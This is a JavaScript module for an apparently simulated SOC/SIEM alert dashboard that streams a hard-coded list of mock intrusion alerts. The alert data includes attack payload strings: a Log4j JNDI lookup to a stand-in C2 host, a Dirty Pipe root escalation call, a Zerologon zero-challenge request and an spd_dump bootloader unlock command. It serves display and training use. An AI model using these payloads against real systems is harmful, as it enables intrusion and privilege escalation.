// =========================================================
// NATIONAL SOC / SIEM INTRUSION DETECTION ENGINE
// Joint Cyber Warfare Defense Command (NCDOC)
// =========================================================

import { cyberAudio } from './audio.js';

export class SiemStreamManager {
  constructor(containerId) {
    this.container = document.getElementById(containerId);
    this.alerts = [];
    this.maxAlerts = 50;
    this.activeFilter = 'ALL';
    this.isPaused = false;
    this.totalAlertsCount = 1842912;

    this.mockDatabase = [
      {
        id: 'SEC-8012',
        time: '12:12:04',
        level: 'CRITICAL',
        engine: 'SURICATA',
        rule: 'ET EXPLOIT MS17-010 SMB Remote Code Execution (EternalBlue)',
        src: '192.168.1.50',
        dst: '192.168.1.100:445',
        mitre: 'T1210: Exploitation of Remote Services',
        actor: 'APT28 / Fancy Bear',
        payload: 'FE 53 4D 42 40 00 00 00 00 00 00 00 0E 00 01 00... [SMBv1 Buffer Overflow]',
        recommendation: 'Block TCP Port 445 on WAN, enforce SMBv3 Signing, apply MS17-010 security rollup.'
      },
      {
        id: 'SEC-8013',
        time: '12:12:15',
        level: 'CRITICAL',
        engine: 'ZEEK-IDS',
        rule: 'Log4j JNDI Lookup Header Injection (CVE-2021-44228)',
        src: '10.0.4.15',
        dst: '10.0.4.80:8080',
        mitre: 'T1190: Exploit Public-Facing Application',
        actor: 'Lazarus Group (Heuristic)',
        payload: '${jndi:ldap://c2.threat-node.io:1389/ExploitPayload.class}',
        recommendation: 'Upgrade log4j-core >= 2.17.1, set FORMAT_MESSAGES_LOOKUP=false, apply WAF regex block.'
      },
      {
        id: 'SEC-8014',
        time: '12:12:28',
        level: 'HIGH',
        engine: 'WAZUH-HIDS',
        rule: 'CVE-2022-0847 Dirty Pipe Kernel Page Cache Hijack',
        src: '172.16.2.50 [k8s-node-03]',
        dst: '/etc/passwd [Local Root PrivEsc]',
        mitre: 'T1068: Exploitation for Privilege Escalation',
        actor: 'Unknown Insider / Lateral Movement',
        payload: 'splice(fd, NULL, pipefd[1], NULL, 1, SPLICE_F_MOVE) -> UID 0 (root)',
        recommendation: 'Deploy Linux Kernel 5.16.11 / 5.15.25 patch immediately, isolate container workload.'
      },
      {
        id: 'SEC-8015',
        time: '12:12:42',
        level: 'CRITICAL',
        engine: 'SNORT-3',
        rule: 'CVE-2020-1472 Zerologon Cryptographic Zero IV Authentication Bypass',
        src: '192.168.1.150',
        dst: '192.168.1.100 [DC01.mil.in]',
        mitre: 'T1003: OS Credential Dumping',
        actor: 'Sandworm (BlackEnergy)',
        payload: 'NetrServerAuthenticate3(AccountName="DC01$", ClientChallenge=0000000000000000)',
        recommendation: 'Enforce Secure RPC for domain members, monitor event ID 4742 machine account password reset.'
      },
      {
        id: 'SEC-8016',
        time: '12:12:59',
        level: 'HIGH',
        engine: 'CROWDSTRIKE',
        rule: 'Cobalt Strike Malleable C2 HTTPS Beaconing Pattern',
        src: '192.168.1.200:51240',
        dst: '104.244.42.1:443 [C2 External IP]',
        mitre: 'T1071.001: Web Protocols (C2 Infiltration)',
        actor: 'Volt Typhoon Cyber Unit',
        payload: 'TLS Client Hello JA3 Hash: 771ad2748f2f1856d452290a445ddc33',
        recommendation: 'Terminate PID 4182, revoke Kerberos Golden Ticket, quarantine endpoint host.'
      },
      {
        id: 'SEC-8017',
        time: '12:13:12',
        level: 'WARNING',
        engine: 'ZEEK-IDS',
        rule: 'BGP Hijacking & Route Leak Anomaly Detected on Autonomous System',
        src: 'AS4134 [Foreign Transit]',
        dst: 'AS45820 [Defense Gateway]',
        mitre: 'T1557: Adversary-in-the-Middle',
        actor: 'State-Sponsored SIGINT Intercept',
        payload: 'AS-PATH Prefix Injection: 103.24.0.0/22 diverted via rogue peer',
        recommendation: 'Trigger RPKI Route Origin Validation, drop unauthorized BGP peer announces.'
      },
      {
        id: 'SEC-8018',
        time: '12:13:30',
        level: 'INFO',
        engine: 'DEFENSE-SHIELD',
        rule: 'Quantum QKD Key Rotation & Hardware Honeynet Redirect Engaged',
        src: 'CERT-In Automated SOC',
        dst: 'Virtual Honeypot Array [10.0.99.0/24]',
        mitre: 'D3-DA: Defensive Decoy Deployment',
        actor: 'Automated Defensive Interceptor',
        payload: 'Diverted 84 malicious probes to Cowrie SSH & Conpot SCADA honeypots.',
        recommendation: 'Telemetry logged for attribution and threat actor signature extraction.'
      },
      {
        id: 'SEC-8019',
        time: '12:13:47',
        level: 'HIGH',
        engine: 'WAZUH-HIDS',
        rule: 'UNISOC BootROM Download-Mode Activity (CVE-2022-38694) - brom 1782:4d00 enumerated + spd_dump executed',
        src: 'LAB-BENCH-01 [172.28.14.92]',
        dst: 'MOB-UNISOC-DEV01 [USB 1782:4d00]',
        mitre: 'T1542.001: Pre-OS Boot: System Firmware',
        actor: 'Authorized Research Operator (CyberShield Lab)',
        payload: 'spd_dump --wait 300 loadexec custom_exec_no_verify_4ee8.bin exec ... w splloader spl-unlock.bin reset',
        recommendation: 'Enforce usbguard/BIOS USB port policy for asset desks, alert on udev events for idVendor=1782, monitor auditd execve of spd_dump/gen_spl-unlock, verify splloader integrity (DHTB header + 0xD503201F NOP scan).'
      }
    ];

    this.initEvents();
    this.startStream();
  }

  initEvents() {
    // Filter buttons
    const filterBtns = document.querySelectorAll('.siem-filter-btn');
    filterBtns.forEach(btn => {
      btn.addEventListener('click', (e) => {
        filterBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        this.activeFilter = btn.dataset.filter || 'ALL';
        cyberAudio.playBeep(900, 0.05);
        this.render();
      });
    });

    // Pause button
    const btnPause = document.getElementById('btn-siem-pause');
    if (btnPause) {
      btnPause.addEventListener('click', () => {
        this.isPaused = !this.isPaused;
        btnPause.textContent = this.isPaused ? '▶ RESUME STREAM' : '⏸ PAUSE';
        btnPause.classList.toggle('active', this.isPaused);
        cyberAudio.playBeep(850, 0.06);
      });
    }

    // Clear button
    const btnClear = document.getElementById('btn-siem-clear');
    if (btnClear) {
      btnClear.addEventListener('click', () => {
        this.alerts = [];
        this.render();
        cyberAudio.playBeep(700, 0.08);
      });
    }

    // Modal Close
    const btnModalClose = document.getElementById('btn-close-siem-modal');
    if (btnModalClose) {
      btnModalClose.addEventListener('click', () => this.closeModal());
    }
  }

  startStream() {
    // Initial Seed
    this.mockDatabase.forEach(item => this.addAlert(item, false));
    this.render();

    // Ticking stream every 3.2 seconds
    setInterval(() => {
      if (this.isPaused) return;

      const randomTemplate = this.mockDatabase[Math.floor(Math.random() * this.mockDatabase.length)];
      const now = new Date();
      const timeStr = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
      const randomId = 'SEC-' + Math.floor(8000 + Math.random() * 2000);

      this.addAlert({
        ...randomTemplate,
        id: randomId,
        time: timeStr
      }, true);

      this.totalAlertsCount++;
      const totalEl = document.getElementById('stat-siem-total');
      if (totalEl) totalEl.textContent = this.totalAlertsCount.toLocaleString();
    }, 3200);
  }

  addAlert(alert, playSound = false) {
    this.alerts.unshift(alert);
    if (this.alerts.length > this.maxAlerts) {
      this.alerts.pop();
    }

    if (playSound && alert.level === 'CRITICAL' && !cyberAudio.isMuted()) {
      cyberAudio.playBeep(1200, 0.08);
    }

    this.render();
  }

  render() {
    if (!this.container) return;

    let filtered = this.alerts;
    if (this.activeFilter === 'CRITICAL') {
      filtered = this.alerts.filter(a => a.level === 'CRITICAL');
    } else if (this.activeFilter === 'HIGH') {
      filtered = this.alerts.filter(a => a.level === 'HIGH');
    } else if (this.activeFilter === 'APT') {
      filtered = this.alerts.filter(a => a.actor && a.actor.includes('APT') || (a.actor && a.actor.includes('Lazarus')) || (a.actor && a.actor.includes('Volt')));
    }

    if (filtered.length === 0) {
      this.container.innerHTML = `
        <tr>
          <td colspan="7" style="padding: 24px; text-align: center; color: var(--text-muted); font-family: var(--font-mono);">
            [NO ACTIVE ALERTS MATCHING FILTER CRITERIA]
          </td>
        </tr>
      `;
      return;
    }

    let html = '';
    filtered.slice(0, 15).forEach((a) => {
      const lvlClass = a.level === 'CRITICAL' ? 'siem-crit' : a.level === 'HIGH' ? 'siem-high' : a.level === 'WARNING' ? 'siem-warn' : 'siem-info';
      html += `
        <tr class="siem-row" data-id="${a.id}">
          <td class="siem-cell-time">${a.time}</td>
          <td><span class="siem-badge ${lvlClass}">${a.level}</span></td>
          <td class="siem-cell-engine">${a.engine}</td>
          <td class="siem-cell-rule">
            <span class="siem-rule-text">${a.rule}</span>
            <div class="siem-mitre-tag">${a.mitre}</div>
          </td>
          <td class="siem-cell-src">${a.src} ➔ ${a.dst}</td>
          <td class="siem-cell-actor">
            <span class="actor-tag">${a.actor}</span>
          </td>
          <td class="siem-cell-actions">
            <div style="display:flex; align-items:center; justify-content:center; gap:4px;">
              <button class="btn-table-action btn-inspect-alert" data-id="${a.id}" title="Inspect Forensic Details">
                🔍 INSPECT
              </button>
              <button class="btn-table-action btn-isolate-host" data-src="${a.src}" title="Isolate Host Firewall">
                🛡️ ISOLATE
              </button>
            </div>
          </td>
        </tr>
      `;
    });

    this.container.innerHTML = html;

    // Attach row click events
    this.container.querySelectorAll('.btn-inspect-alert').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const id = btn.dataset.id;
        const item = this.alerts.find(a => a.id === id);
        if (item) this.openModal(item);
      });
    });

    this.container.querySelectorAll('.btn-isolate-host').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const src = btn.dataset.src;
        cyberAudio.playSuccess();
        btn.textContent = 'ISOLATED ✓';
        btn.classList.add('disabled');
        btn.disabled = true;

        const terminalOutput = document.getElementById('terminal-output');
        if (terminalOutput) {
          const log = document.createElement('div');
          log.className = 'terminal-line';
          log.innerHTML = `<span style="color:#00ff66">[SOC MITIGATION]</span> Endpoint <span style="color:#00e5ff">${src}</span> isolated via iptables DROP rule and quarantined.`;
          terminalOutput.appendChild(log);
          terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }
      });
    });
  }

  openModal(alert) {
    cyberAudio.playBeep(1100, 0.08);
    const modal = document.getElementById('siem-investigate-modal');
    if (!modal) return;

    document.getElementById('modal-siem-id').textContent = alert.id;
    document.getElementById('modal-siem-rule').textContent = alert.rule;
    document.getElementById('modal-siem-level').textContent = alert.level;
    document.getElementById('modal-siem-time').textContent = alert.time;
    document.getElementById('modal-siem-src').textContent = alert.src;
    document.getElementById('modal-siem-dst').textContent = alert.dst;
    document.getElementById('modal-siem-mitre').textContent = alert.mitre;
    document.getElementById('modal-siem-actor').textContent = alert.actor;
    document.getElementById('modal-siem-payload').textContent = alert.payload;
    document.getElementById('modal-siem-rec').textContent = alert.recommendation;

    modal.style.display = 'flex';
  }

  closeModal() {
    const modal = document.getElementById('siem-investigate-modal');
    if (modal) modal.style.display = 'none';
    cyberAudio.playBeep(750, 0.05);
  }
}
